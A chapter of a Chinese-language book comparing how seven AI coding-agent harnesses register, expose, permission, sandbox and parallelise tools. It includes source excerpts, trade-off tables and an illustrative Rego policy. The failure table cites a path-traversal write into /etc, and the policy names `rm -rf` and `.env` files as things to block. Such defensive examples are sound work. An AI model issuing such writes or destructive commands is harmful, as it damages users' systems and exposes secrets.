**Pi 的显式配置（`packages/agent/src/types.ts`）：**

```ts
// Pi 把并行策略暴露为配置，而非硬编码
type ToolExecutionMode = "sequential" | "parallel";
interface AgentLoopConfig {
  toolExecution: {
    mode: ToolExecutionMode;              // 用户可选
    preflightMode: "sequential";          // 强制串行审批
    terminateIfAnyParallelFails?: boolean; // Pi 的细节：parallel 桶内任一失败是否全终止
  };
}
```

> **失败案例 3 — 乐观并行导致的 `write_file` 丢失更新：**
>
> ```
> 模型并行下发：[write_file(path="a.ts", content="v1"), write_file(path="a.ts", content="v2")]
> 若 Orchestrator 无路径去重，并行执行时两个写操作竞争同一 inode，
> 结果取决于内核调度，可能是 v1 也可能是 v2，上下文出现"模型以为写了 v2，实际落盘 v1"的不一致。
> Claude 的解法：unsafe 桶强制串行 + 顺序回填，Pi 的解法：terminate 需 batch 内全员置位才结束，Codex 的解法：ToolCallRuntime(RwLock) 门闸，DeepSeek 的解法：干脆 Inbox.nextStep 串行注入。
> ```

---

## 4.3 对证分解：九家源码对证

### 4.3.1 总览对比表

| 维度 | Claude Code | Codex | Grok Build | OpenCode | Pi | DeepSeek Harness | Claw |
|------|-------------|-------|------------|----------|----|------------------|------|
| **同源载体** | `src/Tool.ts:362 Tool<Input,Output>` + `buildTool()` | `codex-rs/tools/src/tool_executor.rs:106 ToolExecutor<Invocation>{spec(),handle()}` | `crates/codegen/xai-grok-tools/src/bridge.rs ToolBridge` + `xai-tool-runtime ToolRegistry` | `packages/opencode/src/tool/tool.ts:55 Def{parameters,jsonSchema,execute:Effect}` | `packages/agent/src/types.ts AgentTool{id,parameters,execute}` | `dsh-tool-*` 独立包 + `tool-calls.ts:executeToolCalls()` + `Cordis` 插件总线 | `src/tools.py:96 load_tool_snapshot()` + `ToolPool` / `rust/crates/tools/src/lib.rs` |
| **注册与发现** | `src/tools.ts:194 getAllBaseTools()` → `assembleToolPool()` 分区排序 | `core/src/tools/spec_plan.rs:117 build_tool_router()` 每 StepContext 重建 | `ToolRegistry{ToolKind→vendorName}` + `merge_tool_params()` | `tool/registry.ts` + `agent/agent.ts:35 Info{mode}` | `AgentTool[]` 数组 + `extensions pi-extension-*` | `Cordis` 服务依赖注入 + `preset.yml` 组合 | `ToolPool` 快照 |
| **可见性分级** | `ToolSearchTool` + `exposure: Direct\|Deferred\|Hidden` + `defer_loading` | `ToolExposures bitflags{NONE/DIRECT/DEFERRED/CODE_MODE/ALL}` | `ToolRegistry` + `apply_workflow_tool_gates()` | `Info{mode:subagent\|primary\|all}` + `native:true` 隐藏 | `AgentLoopConfig.toolExecution` | `Cordis` preset (`code/standard/minimal/cordis`) | 无（全量暴露） |
| **权限载体** | `ToolPermissionContext{mode, additionalWorkingDirectories, allow/deny/ask}` | `AskForApproval` + `ToolRuntime/SandboxAttempt/ExecApprovalRequirement` | `ToolServerConfig{tools: Vec<ToolConfig>}` + `kind_for()` | `PermissionV1.Ruleset` + `Permission.merge()` | `AgentTool` 级 `isReadOnly` | `Inbox` + `waterfall 'agent/pre-step' decision{enter\|reject}` | `~/.claw/settings.json` |
| **拦截点** | `ToolOrchestrator` 统一 `审批→沙箱→执行→Hook` | `core/src/tools/orchestrator.rs` + `sandboxing.rs` | `bridge.rs TemplateRenderer` + `AgentBuilder.plugin_registry` | `agent/agent.ts:120` | `preflight sequential→execute concurrent` | `waterfall` 插件链 | `conversation.rs` |
| **沙箱** | `SandboxManager` + `@anthropic-ai/sandbox-runtime` | `linux-sandbox/bwrap` + `execpolicy` + `shell-command` | `xai-grok-workspace` + `xai-fast-worktree (btrfs/overlay)` | 透传 OS，无内置沙箱 | `pi-extension-sandbox` | `dsh-tool-bash/bashing-persistent/pwsh` 多后端 | 无（依赖宿主） |
| **并行策略** | 默认串行，`isConcurrencySafe=true` 才并行 | 默认并行，`supports_parallel_tool_calls` 显式声明 | Actor 串行（`ChatStateActor` 单 task 拥有状态） | Effect 并行，`Truncate.wrap()` 统一截断 | 可配置 `sequential\|parallel` | 批量执行但 `Inbox.nextStep` 串行注入 | 批量流 `Vec<AssistantEvent>` |
| **MCP/Skill** | `src/services/mcp/client.ts` + `MCPServerConnection` (首家完整) | `mcp_tool_exposure.rs` + `ResponsesApiNamespace` | `SkillInfo` + `list_skills_with_plugins` | `packages/opencode/src/mcp/` + `plugin` 包 | `pi-extension-*` | `dsh-mcp-client` + `dsh-skill` + `Cordis` | 规划中 |
| **截断** | `toolOrchestration.ts` 末端头尾保留 | `AnyToolResult.into_response()` | `estimate_item_tokens` 含 `tool_calls` | `tool/truncate.ts:Truncate.wrap()` 统一截断 | `transformContext` 层 | `tool_result` 归一 | 无 |

### 4.3.2 分家精读

**Claude Code — 最激进的"悲观正确性" (`src/Tool.ts:362`, `src/tools.ts:194`)**

```ts
// src/Tool.ts:362
export interface Tool<Input, Output> {
  name: string;
  description: string;
  parameters: z.ZodType<Input>;          // Zod 单一真源
  isReadOnly: boolean;
  isConcurrencySafe: boolean;            // 默认 false！关键设计
  execute: (input: Input, ctx: ToolContext) => Promise<Output>;
}
export function buildTool<Input, Output>(def: ToolDef<Input, Output>): Tool<Input, Output> {
  return { isConcurrencySafe: false, isReadOnly: false, ...def }; // 悲观默认
}

// src/tools.ts:194
export function getAllBaseTools(): Tool<any, any>[] {
  return [
    readFileTool, writeFileTool, editTool, bashTool, grepTool, globTool,
    agentTool, taskTool, // 含 subagent
    mcpListResourcesTool, mcpReadResourceTool, // MCP 资源
    toolSearchTool,        // 可见性分级的钥匙：Deferred 工具的检索入口
  ];
}
// assembleToolPool() 按 localeCompare 分区排序 built-ins，保证 cache 断点稳定（见 Ch5）
```

侧重：**宁可慢，不可错**。30+ 工具默认串行，仅 `read_file/grep/glob` 等显式标记 `isConcurrencySafe` 的才并行。`ToolSearchTool` 是 Deferred 懒加载的显式入口，模型需先调 `tool_search(query="git")` 才能看到 `git_*` 工具簇。

**Codex — 最系统化的"类型即契约" (`codex-rs/tools/src/tool_executor.rs:106`, `spec_plan.rs:117`)**

```rust
// codex-rs/tools/src/tool_executor.rs:106
pub trait ToolExecutor {
    type Invocation: ToolInvocation;
    fn spec(&self) -> ToolSpec;                          // 与 handle 同 trait，编译期同源
    fn handle(&self, invocation: Self::Invocation) -> impl Future<Output = ToolResult>;
}

// codex-rs/tools/src/tool_spec.rs:20
pub enum ToolExposure { Direct, Deferred, CodeModeOnly, Hidden }

// core/src/tools/spec_plan.rs:117
pub fn build_tool_router(ctx: &StepContext) -> ToolRouter {
    let mut router = ToolRouter::new();
    router.add_core_tool_sources(ctx);                   // Direct + CodeModeOnly
    router.append_mcp(ctx.mcp_servers());                // 动态 MCP
    router.finalize_tool_router();                       // 冻结
    router.build_model_visible_specs()                   // 产出本轮可见清单
}
```

侧重：**每 StepContext 重建 ToolRouter**，`model_visible_specs` 与本次快照强一致。`ToolCallRuntime(RwLock)` 作为并行门闸，`supports_parallel_tool_calls` 需工具显式声明才放行并行。`linux-sandbox/bwrap` 每次 `bash` 重建沙箱，无状态。

**Grok Build — 最隔离的"Actor + Worktree" (`bridge.rs`)**

```rust
// crates/codegen/xai-grok-tools/src/bridge.rs
pub struct ToolBridge {
    registry: ToolRegistry,                              // ToolKind → vendorName 映射
    renderer: TemplateRenderer,                          // 工具清单与 prompt 同源渲染
}
impl ToolBridge {
    pub fn merge_tool_params(&self, kind: ToolKind) -> serde_json::Value { /* 合并多 vendor 参数 */ }
    pub fn apply_workflow_tool_gates(&self, ctx: &WorkflowCtx) { /* plan 模式强制注入三工具 */ }
}

// Actor 隔离：状态单任务拥有
// xai-chat-state/src/actor/mod.rs
pub struct ChatStateActor { state: ChatState }           // 单 tokio task 拥有，无锁
// 外部仅通过 Command + Oneshot 通信
pub enum Command { ToolCall(ToolCall), GetState(Oneshot<State>), Cancel }
```

侧重：**文件级隔离**。`xai-fast-worktree` 用 `btrfs snapshot` 在 100ms 内为每个 subagent 创建 COW 工作区，并发 `write_file` 不互踩。`ToolRegistry` 兼容 Claude/Cursor 的 allowlist 文件，`ensure_plan_mode_tools(enter/exit/ask_user_question)` 是权限即配置的体现。

**OpenCode — 最现代 TS 的"Effect + 插件化" (`packages/opencode/src/tool/tool.ts:55`)**

```ts
// packages/opencode/src/tool/tool.ts:55
import { Effect } from "effect";
export namespace Tool {
  export interface Def<Input, Output> {
    name: string;
    description: string;
    parameters: z.ZodType<Input>;
    jsonSchema: JSONSchema;                              // 显式 jsonSchema，与 parameters 同源
    execute: (ctx: ToolContext, input: Input) => Effect.Effect<Output, ToolError>;
    // Effect 类型化错误，截断在外层统一处理
  }
}
// agent/agent.ts:90
export interface Info {
  name: string;
  mode: "subagent" | "primary" | "all";                 // 可见性分级：subagent 仅子 agent 可见
  native?: boolean;                                      // native:true = 隐藏 agent（如 compaction）
  permission: PermissionV1.Ruleset;
}
// 截断在工具层统一
// tool/truncate.ts
export const Truncate = {
  wrap: (result: ToolResult, agent: AgentInfo) => {
    const { output, truncated, outputPath } = truncateOutput(result.output, {}, agent);
    return { ...result, output, metadata: { truncated, outputPath } };
  },
};
```

侧重：**Effect 类型化 + 统一截断**。`native:true` 的隐藏 agent（如 `compaction`）永不暴露给主模型。`Truncate.wrap()` 在工具层统一做截断，避免"某工具漏截断导致 context 爆炸"。

**Pi — 最可读的"200 行可配置" (`packages/agent/src/types.ts`)**

```ts
// packages/agent/src/types.ts
export interface AgentTool<Input = any, Output = any> {
  id: string;                                            // Pi 用 id 而非 name
  description: string;
  parameters: z.ZodType<Input>;
  execute: (input: Input, ctx: ToolContext) => Promise<Output>;
}
export type ToolExecutionMode = "sequential" | "parallel";
export interface AgentLoopConfig {
  toolExecution: {
    mode: ToolExecutionMode;                             // 用户可选并行策略
    preflightMode: "sequential";                         // 审批强制串行
  };
  transformContext?: (messages: AgentMessage[], signal: AbortSignal) => Promise<AgentMessage[]>;
}
// 执行语义：preflight 串行 → execute 可并行，terminate 需 batch 内全员置位
```

侧重：**可读性与可配置性**是 Pi 的定位。无内置沙箱，通过 `pi-extension-sandbox` 扩展。`transformContext` 把压缩做在 `AgentMessage` 层，不污染持久化。

**DeepSeek Harness — 最彻底的"一切皆插件" (Cordis)**

```
dsh-tool-read ─┐
dsh-tool-write ─┤
dsh-tool-bash  ─┼─► Cordis 事件总线 ─► tool-calls.ts:executeToolCalls()
dsh-mcp-client ─┤         │
dsh-skill      ─┘         ├─► waterfall 'agent/pre-step' (权限决策)
                          ├─► waterfall 'agent/request' (LLM 调用改写)
                          └─► session-projection-cache (上下文投影)
```

每个工具是独立 npm 包，通过 `Cordis` 服务依赖注入组合。`Inbox` 的 `next-step vs next-turn` 精确打断语义是七家中最细的（见 Ch3）。`dsh-tool-bash/bashing-persistent/pwsh` 提供多 shell 后端，适配 Windows/Linux。

**Claw — 桥梁价值的"移植中" (`src/tools.py:96`)**

```py
# src/tools.py:96
def load_tool_snapshot(path: str) -> ToolSnapshot:
    return ToolSnapshot(yaml.safe_load(open(path)))      # 早期仅名字过滤，无 schema 同源
# rust/crates/tools/src/lib.rs (移植后)
pub struct ToolPool { tools: HashMap<String, ToolDef> }
impl ToolPool {
    pub fn get(&self, name: &str) -> Option<&ToolDef> { self.tools.get(name) }
}
```

侧重：**看"TS 思想如何翻译成 Rust"**。早期 `load_tool_snapshot` 仅做名字过滤是反例，正被 `ToolPool` 的同源设计修正。`compact_after_turns=12` 的固定轮数触发是原型级，已被其他家的 token 预算驱动取代。

### 4.3.3 七家分野的本质

```
同源强度：  Codex(编译期) > Claude/OpenCode(运行时 Zod) > Grok(bridge 合并) > Pi(松散) > Claw(移植中)
可见性精度： Codex(四级) > Claude(三级+ToolSearch) > OpenCode(Info.mode) > Grok(registry gate) > DeepSeek(preset) > Pi(无) > Claw(无)
权限粒度：  Claude(Bash细粒度) > Codex(ExecApprovalRequirement) > OpenCode(Ruleset) > Grok(ToolServerConfig) > DeepSeek(waterfall)
沙箱强度：  Grok(worktree+bwrap) > Codex(bwrap) > Claude(sandbox-runtime) > Pi(扩展) > OpenCode/DeepSeek(透传) > Claw(无)
并行度：    Codex/OpenCode(并行) > Pi(可配置) > DeepSeek(批量串行注入) > Claude(悲观串行) > Grok(Actor串行)
```

> 一句话区分：**Claude 求稳、Codex 求系统、Grok 求隔离、OpenCode 求现代、Pi 求可读、DeepSeek 求插件、Claw 求移植**。

---

## 4.4 结论权衡：何时 Direct vs Deferred、串行 vs 并行、bwrap vs worktree

### 4.4.1 Direct vs Deferred：预算与延迟的交换

**决策树：**

```
工具总数 N  ── N ≤ 10? ── 是 ──► 全量 Direct（简单，无额外往返）
              │
              否
              │
              ▼
        工具是否可聚类？ ── 否 ──► 全量 Direct + 寄望模型长上下文（不推荐，PTL 风险）
              │
              是
              │
              ▼
        按调用频率分层
        ┌─────────────────┬─────────────────┬─────────────────┐
        │ 高频 (每轮必用)  │ 中频 (按任务)    │ 低频 (偶发)      │
        │ read/write/bash │ git/docker/test │ plan/memory/mcp │
        │ → Direct        │ → Deferred      │ → Deferred      │
        │ 常驻可见        │ 检索激活        │ 检索激活        │
        └─────────────────┴─────────────────┴─────────────────┘
              │
              ▼
        检索策略：语义搜索 vs 关键词 vs LLM 自选
        • 关键词最稳（Claude ToolSearch 初始版）
        • 语义最准（Codex 的 embedding 检索）
        • LLM 自选最省（让模型先调 tool_search，再调目标工具，多一 hop）
```

**量化阈值（基于 `chars/4` 估算）：**

| 场景 | 工具数 | 平均描述长度 | 全量 token | 分级后首轮 | 建议 |
|------|--------|-------------|-----------|-----------|------|
| 小型 Agent (my-agent) | 4 | 400 | 1.6K | — | 全 Direct |
| 中型 (Claude 30 工具) | 30 | 600 | 18K | 3.6K (6 Direct) | 必须分级 |
| 大型 (MCP 40+ 工具) | 60 | 500 | 30K | 6K (8 Direct + 存根) | 必须分级 + 检索 |
| 插件化 (DeepSeek Cordis) | 100+ | 400 | 40K+ | 按 preset 组合 | preset 预过滤 + Deferred |

> **经验法则**：当 `N × avg_tokens > 8K` 时必做分级；`Deferred` 工具簇按"动词聚类"（文件/命令/git/plan）而非"名词聚类"更利于检索命中。

### 4.4.2 串行 vs 并行：正确性与吞吐的交换

| 维度 | 串行 (Claude/Grok) | 并行 (Codex/Pi) | 推荐 |
|------|--------------------|--------------------|------|
| **正确性** | 强：无竞争，结果确定 | 弱：需显式 `isConcurrencySafe` 证明 | 副作用工具必串行 |
| **吞吐** | 低：N 个工具 N×RTT | 高：安全桶 N 个工具 1×RTT | 只读工具可并行 |
| **取消** | 易：单工具 `cancellation_token` | 难：`RwLock` 门闸 + `AbortSignal` 广播 | 并行需统一取消令牌 |
| **回填** | 天然有序 | 需 `interleaveByOriginalOrder` | 并行必做顺序回填 |
| **调试** | 易：线性日志 | 难：并发日志交织 | 生产并行必加 `tool_call_id` 追踪 |

**选型矩阵：**

```
              无副作用 (read/list/grep)
                    │
              ┌─────┴─────┐
              │           │
         isConcurrencySafe?
              │           │
         是 ──┘           └─ 否 ──► 串行（悲观正确）
              │
              ▼
           并行 ✅
              │
     副作用 (write/bash/edit)
              │
         默认串行
              │
         同路径去重后可并行？
              │
         否 ──► 串行 ✅
              │
         是 ──► 并行（需路径锁）
```

> **30 秒陈述**："我默认串行，仅对 `isReadOnly && isConcurrencySafe` 的工具并行；并行时 `preflight` 仍串行，前置审批与沙箱决策不并发。`write_file` 即便路径不同也默认串行，除非上层做了路径去重与锁。"

### 4.4.3 bwrap vs worktree vs gVisor：隔离粒度与成本的交换

| 维度 | bwrap (进程级) | worktree (文件系统级) | gVisor (syscall 级) |
|------|---------------|----------------------|---------------------|
| 隔离什么 | 单次工具执行的可见文件/网络 | 整个 subagent 的工作区文件集 | 所有 syscall |
| 启动 | 10ms | 50-100ms | 100ms+ |
| 成本 | 极低（无守护进程） | 中（COW 快照） | 高（Sentry 进程） |
| 并发安全 | 单进程内安全，跨进程需文件锁 | 天然隔离，各写各的分支 | 天然隔离 |
| 适用 | 本地高频 `bash` | 云端并行 subagent | 多租户云端 |
| 代表 | Codex `linux-sandbox` | Grok `xai-fast-worktree` | K8s 沙箱后端 |

**组合策略：**

```
本地 CLI 单 Agent：
  bwrap (每次 bash) + 权限晶格 → 够用，成本最低

本地多 subagent 并行：
  bwrap (单次执行) + worktree (会话隔离) → 双层，防并发写冲突

云端多租户：
  gVisor/runsc (syscall) + worktree (文件) + 权限晶格 → 三层，最强隔离
```

**失败案例 4 — 仅有 bwrap 无 worktree 时的并发写冲突：**

```
主 Agent 与两个 subagent 并行：
  subagent-A: write_file("src/a.ts", "feature A")
  subagent-B: write_file("src/a.ts", "feature B")
  → bwrap 隔离了单次执行的文件可见性，但三个 agent 共享同一 worktree 的 src/a.ts
  → 后写者覆盖前写者，丢失更新

Grok 解法：每个 subagent 分配独立 worktree (btrfs snapshot)，
           完成后通过 merge/conflict 检测合并，而非直接写同一 inode。
```

### 4.4.4 失败案例汇总

| # | 故障 | 根因 | 症状 | 正解 |
|---|------|------|------|------|
| 1 | Schema 漂移 | 规格与执行分离 | 批量 `InvalidArgumentsError` | 同源注册表（Zod/trait） |
| 2 | 路径穿越 | 无沙箱 mount 隔离 | `write_file("../../../etc/...")` 提权 | bwrap `--ro-bind` 只读挂载 |
| 3 | 丢失更新 | 乐观并行无路径锁 | 并行 `write_file` 同路径结果不确定 | 悲观串行 + 路径去重 |
| 4 | 并发写冲突 | 无 worktree 隔离 | 多 subagent 写同一文件互覆盖 | COW worktree + merge |
| 5 | 悬垂工具调用 | 可见性快照不一致 | 模型调了已卸载的 deferred 工具 | 每 StepContext 重建 ToolRouter + 快照校验 |
| 6 | 权限绕过 | 散弹式权限检查 | 新增工具忘加 `if(allowed)` | Orchestrator 横切拦截 |

---

## 4.5 未来：MCP 标准化、Registry Federation、Auto-discovered Tools、Policy-as-Code

> 本节对应要求的四个未来方向：MCP 标准化、Tool Registry Federation、Auto-discovered tools、Policy-as-code。

### 4.5.1 MCP 标准化：从"工具协议"到"上下文协议"

MCP (2024-11) 的野心不止于工具调用，其三类原语预示了 Agent 的"上下文操作系统"：

```
MCP 三原语（Anthropic 规范）:

  tools/       →  可执行能力（本章焦点）
    list_tools / call_tool
    └─ 未来：工具的流式输出、进度通知、取消

  resources/   →  可读上下文（与 Tool 互补）
    list_resources / read_resource
    └─ 未来：订阅式资源（文件变更推送，而非轮询 read_file）

  prompts/     →  可复用提示词模板
    list_prompts / get_prompt
    └─ 未来：与 Tool 联动的"工具感知提示词"
```

**未解之题**：MCP 当前的 `stdio` 传输假设工具与 Agent 同机，`SSE` 假设短连。长运行工具（如 `bash(npm run build)` 需 5 分钟）的**流式进度**与**中途取消**尚未标准化，七家中仅 Grok 的 `SamplingClient` 与 Codex 的 `ToolCallRuntime` 自行实现了取消令牌。

### 4.5.2 Tool Registry Federation：从单注册表到联邦

当工具来自本地、MCP Server、Skill、Remote Agent 四处时，单 `ToolRegistry` 已不够：

```
单注册表（今日）:
  ToolRegistry { Map<name, Tool> }
  → 命名冲突：两个 MCP Server 都提供 read_file 怎么办？

联邦注册表（未来）:
  FederatedRegistry {
    namespaces: Map<namespace, Registry>,  // Codex ResponsesApiNamespace 的泛化
    resolver: (name) → QualifiedName,      // mcp__github__read_file vs local__read_file
    priority: [local, mcp, skill, remote], // 优先级 + 冲突解决
    discovery: SemanticSearch,             // 跨联邦的语义检索（Gorilla 思想的延续）
  }
```

Codex 的 `ResponsesApiNamespace` 已迈出第一步（MCP 工具加命名空间前缀），OpenCode 的 `plugin` 包与 DeepSeek 的 `Cordis` 事件总线是另一条路径——**工具即插件，插件即联邦节点**。

### 4.5.3 Auto-discovered Tools：工具不再是静态列表

今日工具是**静态注册**（`getAllBaseTools()` 在启动时确定），未来是**运行时发现**：

```
静态（今日）:
  启动 → 注册 40 工具 → 首轮暴露 8 Direct + 32 Deferred 存根 → 检索激活

动态（未来）:
  启动 → 注册 8 核心工具
  运行时：
    1. 模型调 tool_search("pdf") → 发现 pdf 工具簇（MCP 动态 list_tools）
    2. 模型调 skill_load("pdf-extract") → 按需安装 skill，工具数从 8 增至 15
    3. 工具描述本身由 LLM 生成（Auto-discovered）：
       "检测到用户在处理 PDF，是否生成专用工具 {extract_pdf_table: {path, page}}？"
```

Grok 的 `list_skills_with_plugins` + `plugin_registry` 与 DeepSeek 的 `Cordis` 已支持运行时 `skill` 加载，Claude 的 `ToolSearchTool` 是发现式的雏形。下一步是**工具的自动合成**——模型根据任务上下文自行生成 `ToolSpec`，而非从预设列表中检索。

### 4.5.4 Policy-as-Code：权限从配置走向可验证策略

今日权限是**静态规则表**（`allow/deny/ask` + 通配匹配），未来是**可验证的策略代码**：

```rego
# 未来：OPA/Rego 风格的 Policy-as-Code（构想）
package agent.tools

# 默认拒绝
default allow = false

# 读操作放行
allow if {
  input.tool in ["read_file", "list_dir", "grep"]
}

# 写操作：仅允许在 worktree 内
allow if {
  input.tool == "write_file"
  startswith(input.args.path, input.worktree_root)
  not contains(input.args.path, ".env")
}

# bash：细粒度命令白名单 + 沙箱强制
allow if {
  input.tool == "bash"
  regex.match("^(git (status|diff|log)|npm (test|run build))", input.args.command)
}
# 危险命令需沙箱 + 人工确认
require_sandbox if { input.tool == "bash" }
require_approval if { regex.match("rm -rf", input.args.command) }
```

| 演进阶段 | 形态 | 代表 | 验证能力 |
|----------|------|------|----------|
| 1.0 静态表 | `allow/deny/ask` + 通配 | Claude/Codex 今日 | 人工审计 |
| 2.0 策略文件 | `PermissionV1.Ruleset` + `merge` | OpenCode | 规则合并可测 |
| 3.0 策略即代码 | Rego/OPA + 签名 | 未来 | 形式化验证 + 策略单元测试 + 审计日志 |

> Policy-as-Code 的附加价值：**策略可被 LLM 自检**。在 `preflight` 阶段，策略引擎可向模型解释"为什么 `write_file(.env)` 被拒"，模型据此自愈（改写路径），而非盲目重试。

### 4.5.5 路线图：给本书读者的动手建议

```
阶段一（今日可做）:
  □ 用 Zod/trait 实现同源注册表，消灭 schema 漂移
  □ 当 N>10 时实现 ToolExposure 分级，首轮预算 <8K
  □ 把权限从工具内部分散检查迁到 Orchestrator 横切
  □ 为 write/bash 加 bwrap/sandbox-runtime 沙箱

阶段二（3-6 个月）:
  □ 接入 MCP，实现工具的发现式加载
  □ 实现 FederatedRegistry，解决命名冲突
  □ 悲观并行：isConcurrencySafe 显式标记 + preflight 串行

阶段三（6-12 个月）:
  □ 运行时 skill 动态加载（参考 Grok Cordis）
  □ worktree 隔离并行 subagent（参考 xai-fast-worktree）
  □ Policy-as-Code：用 Rego/JSON 策略替代静态表

阶段四（研究向）:
  □ Auto-discovered Tools：模型自生成 ToolSpec
  □ 策略的 LLM 可解释性：被拒时自动建议替代方案
  □ 跨 Agent Tool Federation：工具在多 Agent 间共享与计费
```

---

## 4.6 小结：Checklist

- [ ] 能说清 Toolformer → Gorilla → ToolLLM → Function Calling → MCP → BFCL 的 lineage，以及每步对工具设计的遗产
- [ ] 能解释"规格与执行同源"为什么是必选项，并举出 schema 漂移的故障症状
- [ ] 能手写 `ToolExposure` 四级分级与 `buildToolRouter()` 的每轮重建伪代码，并算清分级前后的首轮预算
- [ ] 能画出权限晶格（Deny > Ask > Allow）与 Orchestrator 横切拦截时序
- [ ] 能画出 bwrap 沙箱时序（审批→沙箱决策→bwrap fork→执行→截断→回填）并区分 bwrap/worktree/gVisor 的隔离粒度
- [ ] 能说清 `isConcurrencySafe` 为什么默认 false，以及 `preflight 串行 + 执行分桶 + 顺序回填` 的三段式并行正确性
- [ ] 能按七家源码锚点（`Tool.ts:362 / tools.ts:194 / spec_plan.rs:117 / bridge.rs / tool.ts:30 / types.ts / Cordis`）对比同源、可见性、权限、沙箱、并行五维
- [ ] 能按"工具数 N × 描述长度"阈值决策 Direct vs Deferred，按"是否为副作用"决策串行 vs 并行，按"单次执行 vs 会话隔离"决策 bwrap vs worktree
- [ ] 能展望 MCP 标准化、Registry Federation、Auto-discovered Tools、Policy-as-Code 四个未来方向

> 下一章看"工具执行完往哪放"——Context / Memory / Compaction 的预算、压缩与投影。

